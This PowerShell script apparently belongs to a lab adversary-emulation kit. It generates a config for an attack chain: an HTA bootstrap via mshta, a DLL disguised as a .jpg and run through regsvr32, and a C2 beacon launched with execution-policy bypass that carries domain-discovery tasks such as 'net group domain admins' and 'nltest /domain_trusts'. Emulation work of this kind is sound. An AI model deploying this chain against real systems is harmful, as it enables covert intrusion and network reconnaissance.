<#
.SYNOPSIS
Generate the per-run C0015 config.ini for a phase-1 campaign run (entry -> bootstrap -> beacon).
Config-driven; NO hardcoded lab values and NO secrets are placed in the file.
The session token is NOT stored here: the beacon generates its own S1-<16hex> at runtime
(or reads $env:C0015_SESSION_TOKEN) so the token never sits in config/logs.

.PARAMETER RunId        RUN-YYYYMMDD-<seq> run identifier.
.PARAMETER C2Host       IP/hostname of the C2 host running scripts/c2sim_v2.py.
.PARAMETER C2Port       C2-SIM port (default 8080).
.PARAMETER HttpHost     IP/hostname of the HTTP server serving the DLL (defaults to C2Host).
.PARAMETER HttpPort     HTTP download port (default 8000).
.PARAMETER OutPath      Where to write config.ini (default C:\Users\Public\C0015\config.ini on WS01).
.PARAMETER PublicDir    Lab staging base directory on WS01 (default C:\Users\Public\C0015).
.EXAMPLE
pwsh -File payloads/packaging/make_config.ps1 -RunId RUN-20261001-01 -C2Host 192.168.50.100 -OutPath stage\ws01\config.ini
#>
param(
    [Parameter(Mandatory=$true)][string]$RunId,
    [Parameter(Mandatory=$true)][string]$C2Host,
    [int]$C2Port = 8080,
    [string]$HttpHost = '',
    [int]$HttpPort = 8000,
    [string]$OutPath = 'C:\Users\Public\C0015\config.ini',
    [string]$PublicDir = 'C:\Users\Public\C0015'
)
$ErrorActionPreference = 'Stop'

if (-not $RunId -match '^RUN-\d{8}-\d{2,}$') { throw "RunId must be RUN-YYYYMMDD-<seq> (got: $RunId)" }
if (-not $HttpHost) { $HttpHost = $C2Host }
if ($C2Host -match '[<>]' -or $HttpHost -match '[<>]') { throw "C2/HTTP host must be a concrete lab address, not a placeholder" }

$lines = @(
    '; ============================================================'
    '; c0015 lab config - generated per run by payloads/packaging/make_config.ps1'
    '; NO secrets: session token is generated at runtime by the beacon, never stored here.'
    ''
    '[lab]'
    "run_id=$RunId"
    'scenario_id=C0015-LAB-1'
    ''
    '[bootstrap]'
    "hta_path=$PublicDir\bootstrap.hta"
    'mshta_path=C:\Windows\System32\mshta.exe'
    "http_host=$HttpHost"
    "http_port=$HttpPort"
    'dll_name=c0015-comparefor.jpg'
    "dll_local_dir=$PublicDir"
    'marker_name=dll-executed.txt'
    'b64_marker_name=b64-marker.txt'
    'b64_value=YzAwMTUgbGFiIGJlbmlnbg=='
    'regsvr32_path=C:\Windows\System32\regsvr32.exe'
    ''
    '[c2sim]'
    "c2_url=http://$C2Host`:$C2Port"
    'stage=phase3'
    'host_alias=WS01'
    'token_env=C0015_SESSION_TOKEN'
    ''
    '[beacon]'
    'loop_count=12'
    'loop_sleep_sec=2'
    'loop_sleep_jitter_sec=2'
    'result_cap_bytes=262144'
    "public_ip_check_url=http://${C2Host}:8001/myip"
    'public_ip_check_enabled=0'
    "beacon_cmd=powershell.exe -NoProfile -ExecutionPolicy Bypass -File $PublicDir\c0015_beacon.ps1 -Config $PublicDir\config.ini"
    'task_T-DISCOVER-CORPUS=cmd.exe /c net view /all'
    'task_T-DISCOVER-SYSTEM=cmd.exe /c tasklist /s localhost'
    'task_T-DISCOVER-DOMAINGROUPS=cmd.exe /c net group "domain admins" /dom'
    'task_T-DISCOVER-LOCALGROUPS=cmd.exe /c net localgroup "administrator"'
    'task_T-DISCOVER-TRUSTS=cmd.exe /c nltest /domain_trusts /all_trusts'
    'task_T-DISCOVER-NETVIEWALL=cmd.exe /c net view /all /domain'
    'task_T-DISCOVER-TIME=cmd.exe /c net view /all time'
    'task_T-DISCOVER-PING=cmd.exe /c ping -n 1 FS01'
    'task_T-BEACON-SLEEP=ping -n 2 127.0.0.1 >nul'
    'task_T-NOOP=cmd.exe /c ver'
    ''
    '[impact]'
    '; no impact manifest for the phase-1 run; S1..S3 only'
)
$out = [IO.Path]::GetFullPath($OutPath)
$dir = Split-Path $out -Parent
if ($dir) { New-Item -ItemType Directory -Force -Path $dir | Out-Null }
Set-Content -LiteralPath $out -Value ($lines -join "`r`n") -Encoding ASCII
Write-Output "config written: $out"
Write-Output "  c2_url=$HttpHost`:$C2Port  dll download=http://$HttpHost`:$HttpPort/c0015-comparefor.jpg"